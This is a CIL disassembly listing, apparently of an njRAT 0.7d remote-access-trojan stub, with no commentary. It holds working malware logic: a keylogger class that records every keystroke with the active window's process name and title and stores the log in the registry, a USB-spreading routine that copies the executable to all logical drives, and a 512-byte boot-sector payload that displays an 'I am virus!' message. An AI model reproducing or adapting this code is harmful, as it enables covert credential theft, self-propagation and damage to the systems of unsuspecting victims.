  .field private valuetype [System.Windows.Forms]System.Windows.Forms.Keys lastKey
  .field public string Logs
  .field public string vn
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       36 (0x24)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  ldc.i4.0
    IL_0008:  stfld      valuetype [System.Windows.Forms]System.Windows.Forms.Keys j.kl::lastKey
    IL_000d:  ldarg.0
    IL_000e:  ldstr      ""
    IL_0013:  stfld      string j.kl::Logs
    IL_0018:  ldarg.0
    IL_0019:  ldstr      "[kl]"
    IL_001e:  stfld      string j.kl::vn
    IL_0023:  ret
  } // end of method kl::.ctor

  .method private instance string  AV() cil managed
  {
    // Code size       216 (0xd8)
    .maxstack  5
    .locals init (string V_0,
             int32 V_1,
             native int V_2,
             class [System]System.Diagnostics.Process V_3,
             valuetype [mscorlib]System.DateTime V_4,
             class [mscorlib]System.Exception V_5)
    .try
    {
      IL_0000:  call       native int j.OK::GetForegroundWindow()
      IL_0005:  stloc.2
      IL_0006:  ldloc.2
      IL_0007:  ldloca.s   V_1
      IL_0009:  call       int32 j.kl::GetWindowThreadProcessId(native int,
                                                                int32&)
      IL_000e:  pop
      IL_000f:  ldloc.1
      IL_0010:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetProcessById(int32)
      IL_0015:  stloc.3
      IL_0016:  ldloca.s   V_2
      IL_0018:  call       instance int32 [mscorlib]System.IntPtr::ToInt32()
      IL_001d:  ldarg.0
      IL_001e:  ldfld      int32 j.kl::LastAV
      IL_0023:  ceq
      IL_0025:  ldarg.0
      IL_0026:  ldfld      string j.kl::LastAS
      IL_002b:  ldloc.3
      IL_002c:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
      IL_0031:  ldc.i4.0
      IL_0032:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0037:  ldc.i4.0
      IL_0038:  ceq
      IL_003a:  and
      IL_003b:  ldloc.3
      IL_003c:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
      IL_0041:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0046:  ldc.i4.0
      IL_0047:  ceq
      IL_0049:  or
      IL_004a:  brtrue.s   IL_00b3

      IL_004c:  ldarg.0
      IL_004d:  ldloca.s   V_2
      IL_004f:  call       instance int32 [mscorlib]System.IntPtr::ToInt32()
      IL_0054:  stfld      int32 j.kl::LastAV
      IL_0059:  ldarg.0
      IL_005a:  ldloc.3
      IL_005b:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
      IL_0060:  stfld      string j.kl::LastAS
      IL_0065:  ldc.i4.6
      IL_0066:  newarr     [mscorlib]System.String
      IL_006b:  dup
      IL_006c:  ldc.i4.0
      IL_006d:  ldstr      bytearray (0D 00 0A 00 01 00 ) 
      IL_0072:  stelem.ref
      IL_0073:  dup
      IL_0074:  ldc.i4.1
      IL_0075:  call       valuetype [mscorlib]System.DateTime [Microsoft.VisualBasic]Microsoft.VisualBasic.DateAndTime::get_Now()
      IL_007a:  stloc.s    V_4
      IL_007c:  ldloca.s   V_4
      IL_007e:  ldstr      "yy/MM/dd "
      IL_0083:  call       instance string [mscorlib]System.DateTime::ToString(string)
      IL_0088:  stelem.ref
      IL_0089:  dup
      IL_008a:  ldc.i4.2
      IL_008b:  ldloc.3
      IL_008c:  callvirt   instance string [System]System.Diagnostics.Process::get_ProcessName()
      IL_0091:  stelem.ref
      IL_0092:  dup
      IL_0093:  ldc.i4.3
      IL_0094:  ldstr      " "
      IL_0099:  stelem.ref
      IL_009a:  dup
      IL_009b:  ldc.i4.4
      IL_009c:  ldarg.0
      IL_009d:  ldfld      string j.kl::LastAS
      IL_00a2:  stelem.ref
      IL_00a3:  dup
      IL_00a4:  ldc.i4.5
      IL_00a5:  ldstr      bytearray (01 00 0D 00 0A 00 ) 
      IL_00aa:  stelem.ref
      IL_00ab:  call       string [mscorlib]System.String::Concat(string[])
      IL_00b0:  stloc.0
      IL_00b1:  leave.s    IL_00d6

      IL_00b3:  leave.s    IL_00d0

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00b5:  dup
      IL_00b6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00bb:  stloc.s    V_5
      IL_00bd:  ldloc.s    V_5
      IL_00bf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00c4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00c9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00ce:  leave.s    IL_00d0

    }  // end handler
    IL_00d0:  ldstr      ""
    IL_00d5:  stloc.0
    IL_00d6:  ldloc.0
    IL_00d7:  ret
  } // end of method kl::AV

  .method private instance string  Fix(valuetype [System.Windows.Forms]System.Windows.Forms.Keys k) cil managed
  {
    // Code size       380 (0x17c)
    .maxstack  3
    .locals init (string V_0,
             string V_1,
             bool V_2,
             valuetype [System.Windows.Forms]System.Windows.Forms.Keys V_3,
             class [mscorlib]System.Exception V_4,
             char V_5)
    IL_0000:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
    IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
    IL_000a:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_ShiftKeyDown()
    IL_000f:  stloc.2
    IL_0010:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
    IL_0015:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
    IL_001a:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_CapsLock()
    IL_001f:  brfalse.s  IL_002a

    IL_0021:  ldloc.2
    IL_0022:  brfalse.s  IL_0028

    IL_0024:  ldc.i4.0
    IL_0025:  stloc.2
    IL_0026:  br.s       IL_002a

    IL_0028:  ldc.i4.1
    IL_0029:  stloc.2
    IL_002a:  nop
    .try
    {
      IL_002b:  ldarg.1
      IL_002c:  stloc.3
      IL_002d:  ldloc.3
      IL_002e:  ldc.i4.s   35
      IL_0030:  bgt.s      IL_0066

      IL_0032:  ldloc.3
      IL_0033:  ldc.i4.s   13
      IL_0035:  bgt.s      IL_0050

      IL_0037:  ldloc.3
      IL_0038:  ldc.i4.8
      IL_0039:  beq.s      IL_00a1

      IL_003b:  ldloc.3
      IL_003c:  ldc.i4.s   9
      IL_003e:  beq        IL_00fe

      IL_0043:  ldloc.3
      IL_0044:  ldc.i4.s   13
      IL_0046:  beq        IL_00d9

      IL_004b:  br         IL_0106

      IL_0050:  ldloc.3
      IL_0051:  ldc.i4.s   16
      IL_0053:  sub
      IL_0054:  ldc.i4.1
      IL_0055:  ble.un.s   IL_00c3

      IL_0057:  ldloc.3
      IL_0058:  ldc.i4.s   32
      IL_005a:  beq.s      IL_00ce

      IL_005c:  ldloc.3
      IL_005d:  ldc.i4.s   35
      IL_005f:  beq.s      IL_00c3

      IL_0061:  br         IL_0106

      IL_0066:  ldloc.3
      IL_0067:  ldc.i4     0xa3
      IL_006c:  bgt.s      IL_0087

      IL_006e:  ldloc.3
      IL_006f:  ldc.i4.s   46
      IL_0071:  beq.s      IL_00a1

      IL_0073:  ldloc.3
      IL_0074:  ldc.i4.s   112
      IL_0076:  sub
      IL_0077:  ldc.i4.s   11
      IL_0079:  ble.un.s   IL_00c3

      IL_007b:  ldloc.3
      IL_007c:  ldc.i4     0xa0
      IL_0081:  sub
      IL_0082:  ldc.i4.3
      IL_0083:  ble.un.s   IL_00c3

      IL_0085:  br.s       IL_0106

      IL_0087:  ldloc.3
      IL_0088:  ldc.i4     0x10000
      IL_008d:  beq.s      IL_00c3

      IL_008f:  ldloc.3
      IL_0090:  ldc.i4     0x20000
      IL_0095:  beq.s      IL_00c3

      IL_0097:  ldloc.3
      IL_0098:  ldc.i4     0x40000
      IL_009d:  beq.s      IL_00c3

      IL_009f:  br.s       IL_0106

      IL_00a1:  ldstr      "["
      IL_00a6:  ldarga.s   k
      IL_00a8:  constrained. [System.Windows.Forms]System.Windows.Forms.Keys
      IL_00ae:  callvirt   instance string [mscorlib]System.Enum::ToString()
      IL_00b3:  ldstr      "]"
      IL_00b8:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00bd:  stloc.0
      IL_00be:  leave      IL_017a

      IL_00c3:  ldstr      ""
      IL_00c8:  stloc.0
      IL_00c9:  leave      IL_017a

      IL_00ce:  ldstr      " "
      IL_00d3:  stloc.0
      IL_00d4:  leave      IL_017a

      IL_00d9:  ldarg.0
      IL_00da:  ldfld      string j.kl::Logs
      IL_00df:  ldstr      "[ENTER]\r\n"
      IL_00e4:  callvirt   instance bool [mscorlib]System.String::EndsWith(string)
      IL_00e9:  brfalse.s  IL_00f6

      IL_00eb:  ldstr      ""
      IL_00f0:  stloc.0
      IL_00f1:  leave      IL_017a

      IL_00f6:  ldstr      "[ENTER]\r\n"
      IL_00fb:  stloc.0
      IL_00fc:  leave.s    IL_017a

      IL_00fe:  ldstr      "[TAP]\r\n"
      IL_0103:  stloc.0
      IL_0104:  leave.s    IL_017a

      IL_0106:  ldloc.2
      IL_0107:  brfalse.s  IL_0118

      IL_0109:  ldarg.1
      IL_010a:  conv.ovf.u4
      IL_010b:  call       string j.kl::VKCodeToUnicode(uint32)
      IL_0110:  callvirt   instance string [mscorlib]System.String::ToUpper()
      IL_0115:  stloc.0
      IL_0116:  leave.s    IL_017a

      IL_0118:  ldarg.1
      IL_0119:  conv.ovf.u4
      IL_011a:  call       string j.kl::VKCodeToUnicode(uint32)
      IL_011f:  stloc.1
      IL_0120:  leave.s    IL_0178

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0122:  dup
      IL_0123:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0128:  stloc.s    V_4
      IL_012a:  ldloc.s    V_4
      IL_012c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0131:  ldloc.2
      IL_0132:  brfalse.s  IL_0157

      IL_0134:  ldarg.1
      IL_0135:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_013a:  stloc.s    V_5
      IL_013c:  ldloca.s   V_5
      IL_013e:  call       instance string [mscorlib]System.Char::ToString()
      IL_0143:  callvirt   instance string [mscorlib]System.String::ToUpper()
      IL_0148:  stloc.1
      IL_0149:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_014e:  ldloc.1
      IL_014f:  stloc.0
      IL_0150:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0155:  leave.s    IL_017a

      IL_0157:  ldarg.1
      IL_0158:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_015d:  stloc.s    V_5
      IL_015f:  ldloca.s   V_5
      IL_0161:  call       instance string [mscorlib]System.Char::ToString()
      IL_0166:  callvirt   instance string [mscorlib]System.String::ToLower()
      IL_016b:  stloc.1
      IL_016c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0171:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0176:  leave.s    IL_0178

    }  // end handler
    IL_0178:  ldloc.1
    IL_0179:  stloc.0
    IL_017a:  ldloc.0
    IL_017b:  ret
  } // end of method kl::Fix

  .method private static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          int16  GetAsyncKeyState(int32 a) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          int32  GetKeyboardLayout(int32 a) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          bool  GetKeyboardState(uint8[] a) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" nomangle ansi lasterr winapi) 
          int32  GetWindowThreadProcessId(native int a,
                                          int32& b) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          uint32  MapVirtualKey(uint32 a,
                                uint32 b) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          int32  ToUnicodeEx(uint32 a,
                             uint32 b,
                             uint8[] c,
                             [out] class [mscorlib]System.Text.StringBuilder  marshal( lpwstr) d,
                             int32 e,
                             uint32 f,
                             native int g) cil managed preservesig
  {
  }
  .method private static string  VKCodeToUnicode(uint32 a) cil managed
  {
    // Code size       138 (0x8a)
    .maxstack  7
    .locals init (string V_0,
             class [mscorlib]System.Text.StringBuilder V_1,
             uint8[] V_2,
             uint32 V_3,
             int32 V_4,
             native int V_5,
             class [mscorlib]System.Exception V_6,
             valuetype [System.Windows.Forms]System.Windows.Forms.Keys V_7)
    .try
    {
      IL_0000:  newobj     instance void [mscorlib]System.Text.StringBuilder::.ctor()
      IL_0005:  stloc.1
      IL_0006:  ldc.i4     0xff
      IL_000b:  newarr     [mscorlib]System.Byte
      IL_0010:  stloc.2
      IL_0011:  ldloc.2
      IL_0012:  call       bool j.kl::GetKeyboardState(uint8[])
      IL_0017:  brtrue.s   IL_0021

      IL_0019:  ldstr      ""
      IL_001e:  stloc.0
      IL_001f:  leave.s    IL_0088

      IL_0021:  ldarg.0
      IL_0022:  ldc.i4.0
      IL_0023:  call       uint32 j.kl::MapVirtualKey(uint32,
                                                      uint32)
      IL_0028:  stloc.3
      IL_0029:  ldc.i4.0
      IL_002a:  stloc.s    V_4
      IL_002c:  call       native int j.OK::GetForegroundWindow()
      IL_0031:  ldloca.s   V_4
      IL_0033:  call       int32 j.kl::GetWindowThreadProcessId(native int,
                                                                int32&)
      IL_0038:  call       int32 j.kl::GetKeyboardLayout(int32)
      IL_003d:  call       native int [mscorlib]System.IntPtr::op_Explicit(int32)
      IL_0042:  stloc.s    V_5
      IL_0044:  ldarg.0
      IL_0045:  ldloc.3
      IL_0046:  ldloc.2
      IL_0047:  ldloc.1
      IL_0048:  ldc.i4.5
      IL_0049:  ldc.i4.0
      IL_004a:  ldloc.s    V_5
      IL_004c:  call       int32 j.kl::ToUnicodeEx(uint32,
                                                   uint32,
                                                   uint8[],
                                                   class [mscorlib]System.Text.StringBuilder,
                                                   int32,
                                                   uint32,
                                                   native int)
      IL_0051:  pop
      IL_0052:  ldloc.1
      IL_0053:  callvirt   instance string [mscorlib]System.Text.StringBuilder::ToString()
      IL_0058:  stloc.0
      IL_0059:  leave.s    IL_0088

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_005b:  dup
      IL_005c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0061:  stloc.s    V_6
      IL_0063:  ldloc.s    V_6
      IL_0065:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_006a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_006f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0074:  leave.s    IL_0076

    }  // end handler
    IL_0076:  ldarg.0
    IL_0077:  conv.ovf.i4.un
    IL_0078:  stloc.s    V_7
    IL_007a:  ldloca.s   V_7
    IL_007c:  constrained. [System.Windows.Forms]System.Windows.Forms.Keys
    IL_0082:  callvirt   instance string [mscorlib]System.Enum::ToString()
    IL_0087:  stloc.0
    IL_0088:  ldloc.0
    IL_0089:  ret
  } // end of method kl::VKCodeToUnicode

  .method public instance void  WRK() cil managed
  {
    // Code size       286 (0x11e)
    .maxstack  5
    .locals init (int32 V_0,
             int32 V_1,
             valuetype [System.Windows.Forms]System.Windows.Forms.Keys V_2,
             string V_3,
             int32 V_4,
             class [mscorlib]System.Exception V_5)
    IL_0000:  ldarg.0
    IL_0001:  ldarg.0
    IL_0002:  ldfld      string j.kl::vn
    IL_0007:  ldstr      ""
    IL_000c:  call       object j.OK::GTV(string,
                                          object)
    IL_0011:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_0016:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_001b:  stfld      string j.kl::Logs
    .try
    {
      IL_0020:  ldc.i4.0
      IL_0021:  stloc.0
      IL_0022:  ldloc.0
      IL_0023:  ldc.i4.1
      IL_0024:  add.ovf
      IL_0025:  stloc.0
      IL_0026:  ldc.i4.0
      IL_0027:  stloc.1
      IL_0028:  ldloc.1
      IL_0029:  call       int16 j.kl::GetAsyncKeyState(int32)
      IL_002e:  ldc.i4     0xffff8001
      IL_0033:  ceq
      IL_0035:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_003a:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
      IL_003f:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_CtrlKeyDown()
      IL_0044:  ldc.i4.0
      IL_0045:  ceq
      IL_0047:  and
      IL_0048:  brfalse.s  IL_008d

      IL_004a:  ldloc.1
      IL_004b:  stloc.2
      IL_004c:  ldarg.0
      IL_004d:  ldloc.2
      IL_004e:  call       instance string j.kl::Fix(valuetype [System.Windows.Forms]System.Windows.Forms.Keys)
      IL_0053:  stloc.3
      IL_0054:  ldloc.3
      IL_0055:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_005a:  ldc.i4.0
      IL_005b:  ble.s      IL_0086

      IL_005d:  ldarg.0
      IL_005e:  ldarg.0
      IL_005f:  ldfld      string j.kl::Logs
      IL_0064:  ldarg.0
      IL_0065:  call       instance string j.kl::AV()
      IL_006a:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_006f:  stfld      string j.kl::Logs
      IL_0074:  ldarg.0
      IL_0075:  ldarg.0
      IL_0076:  ldfld      string j.kl::Logs
      IL_007b:  ldloc.3
      IL_007c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0081:  stfld      string j.kl::Logs
      IL_0086:  ldarg.0
      IL_0087:  ldloc.2
      IL_0088:  stfld      valuetype [System.Windows.Forms]System.Windows.Forms.Keys j.kl::lastKey
      IL_008d:  ldloc.1
      IL_008e:  ldc.i4.1
      IL_008f:  add.ovf
      IL_0090:  stloc.1
      IL_0091:  ldloc.1
      IL_0092:  ldc.i4     0xff
      IL_0097:  ble.s      IL_0028

      IL_0099:  ldloc.0
      IL_009a:  ldc.i4     0x3e8
      IL_009f:  bne.un.s   IL_00f7

      IL_00a1:  ldc.i4.0
      IL_00a2:  stloc.0
      IL_00a3:  ldstr      "[klen]"
      IL_00a8:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_00ad:  ldc.i4     0x400
      IL_00b2:  mul.ovf
      IL_00b3:  stloc.s    V_4
      IL_00b5:  ldarg.0
      IL_00b6:  ldfld      string j.kl::Logs
      IL_00bb:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_00c0:  ldloc.s    V_4
      IL_00c2:  ble.s      IL_00e4

      IL_00c4:  ldarg.0
      IL_00c5:  ldarg.0
      IL_00c6:  ldfld      string j.kl::Logs
      IL_00cb:  ldc.i4.0
      IL_00cc:  ldarg.0
      IL_00cd:  ldfld      string j.kl::Logs
      IL_00d2:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_00d7:  ldloc.s    V_4
      IL_00d9:  sub.ovf
      IL_00da:  callvirt   instance string [mscorlib]System.String::Remove(int32,
                                                                           int32)
      IL_00df:  stfld      string j.kl::Logs
      IL_00e4:  ldarg.0
      IL_00e5:  ldfld      string j.kl::vn
      IL_00ea:  ldarg.0
      IL_00eb:  ldfld      string j.kl::Logs
      IL_00f0:  ldc.i4.1
      IL_00f1:  call       bool j.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_00f6:  pop
      IL_00f7:  ldc.i4.1
      IL_00f8:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_00fd:  br         IL_0022

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0102:  dup
      IL_0103:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0108:  stloc.s    V_5
      IL_010a:  ldloc.s    V_5
      IL_010c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0111:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0116:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_011b:  leave.s    IL_011d

    }  // end handler
    IL_011d:  ret
  } // end of method kl::WRK

} // end of class j.kl

.class public auto ansi j.A
       extends [mscorlib]System.Object
{
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method A::.ctor

  .method public static void  main() cil managed
  {
    .entrypoint
    .custom instance void [mscorlib]System.STAThreadAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       6 (0x6)
    .maxstack  8
    IL_0000:  call       void j.OK::ko()
    IL_0005:  ret
  } // end of method A::main

} // end of class j.A

.class public auto ansi spredusb
       extends [mscorlib]System.Object
{
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method spredusb::.ctor

  .method public static void  Start() cil managed
  {
    // Code size       104 (0x68)
    .maxstack  3
    .locals init (string V_0,
             string[] V_1,
             int32 V_2)
    IL_0000:  call       class My.MyComputer My.MyProject::get_Computer()
    IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
    IL_000a:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::get_SpecialDirectories()
    IL_000f:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy::get_ProgramFiles()
    IL_0014:  stloc.0
    IL_0015:  call       string[] [mscorlib]System.IO.Directory::GetLogicalDrives()
    IL_001a:  stloc.1
    IL_001b:  ldc.i4.0
    IL_001c:  stloc.2
    IL_001d:  br.s       IL_0061

    IL_001f:  ldloc.1
    IL_0020:  ldloc.2
    IL_0021:  ldelem.ref
    IL_0022:  stloc.0
    .try
    {
      IL_0023:  ldloc.0
      IL_0024:  ldsfld     string j.OK::RG
      IL_0029:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_002e:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_0033:  brtrue.s   IL_004f

      IL_0035:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::GetExecutingAssembly()
      IL_003a:  callvirt   instance string [mscorlib]System.Reflection.Assembly::get_Location()
      IL_003f:  ldloc.0
      IL_0040:  ldsfld     string j.OK::RG
      IL_0045:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_004a:  call       void [mscorlib]System.IO.File::Copy(string,
                                                               string)
      IL_004f:  leave.s    IL_005d

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0051:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0056:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_005b:  leave.s    IL_005d

    }  // end handler
    IL_005d:  ldloc.2
    IL_005e:  ldc.i4.1
    IL_005f:  add.ovf
    IL_0060:  stloc.2
    IL_0061:  ldloc.2
    IL_0062:  ldloc.1
    IL_0063:  ldlen
    IL_0064:  conv.i4
    IL_0065:  blt.s      IL_001f

    IL_0067:  ret
  } // end of method spredusb::Start

} // end of class spredusb

.class private auto ansi sealed '<PrivateImplementationDetails>'
       extends [mscorlib]System.Object
{
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .class explicit ansi sealed nested private '__StaticArrayInitTypeSize=512'
         extends [mscorlib]System.ValueType
  {
    .pack 1
    .size 512
  } // end of class '__StaticArrayInitTypeSize=512'

  .field static assembly initonly valuetype '<PrivateImplementationDetails>'/'__StaticArrayInitTypeSize=512' F4302D72A369C8BADBF2BE9C2854DF4529637155 at I_0001285C
  .method assembly static uint32  ComputeStringHash(string s) cil managed
  {
    // Code size       44 (0x2c)
    .maxstack  2
    .locals init (uint32 V_0,
             int32 V_1)
    IL_0000:  ldc.i4     0x811c9dc5
    IL_0005:  stloc.0
    IL_0006:  ldarg.0
    IL_0007:  brfalse.s  IL_002a

    IL_0009:  ldc.i4.0
    IL_000a:  stloc.1
    IL_000b:  br.s       IL_0021

    IL_000d:  ldarg.0
    IL_000e:  ldloc.1
    IL_000f:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
    IL_0014:  ldloc.0
    IL_0015:  xor
    IL_0016:  ldc.i4     0x1000193
    IL_001b:  mul
    IL_001c:  stloc.0
    IL_001d:  ldloc.1
    IL_001e:  ldc.i4.1
    IL_001f:  add
    IL_0020:  stloc.1
    IL_0021:  ldloc.1
    IL_0022:  ldarg.0
    IL_0023:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0028:  blt.s      IL_000d

    IL_002a:  ldloc.0
    IL_002b:  ret
  } // end of method '<PrivateImplementationDetails>'::ComputeStringHash

} // end of class '<PrivateImplementationDetails>'


// =============================================================

.data cil I_0001285C = bytearray (
                 EB 00 31 C0 8E D8 FC B8 12 00 CD 10 BE 24 7C B3  // ..1..........$|.
                 03 E8 02 00 EB FE B7 00 AC 3C 00 74 06 B4 0E CD  // .........<.t....
                 10 EB F5 C3 49 20 61 6D 20 76 69 72 75 73 21 20  // ....I am virus! 
                 46 75 63 6B 20 59 6F 75 20 3A 2D 29 00 00 00 00  // Fuck You :-)....
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 55 AA) // ..............U.
// *********** DISASSEMBLY COMPLETE ***********************
// WARNING: Created Win32 resource file C:\Users\Nuke\Desktop\zxc\SRC-njRAT-0.7d-Platinum-Edition-main\Stub\bin\Release\Application.res
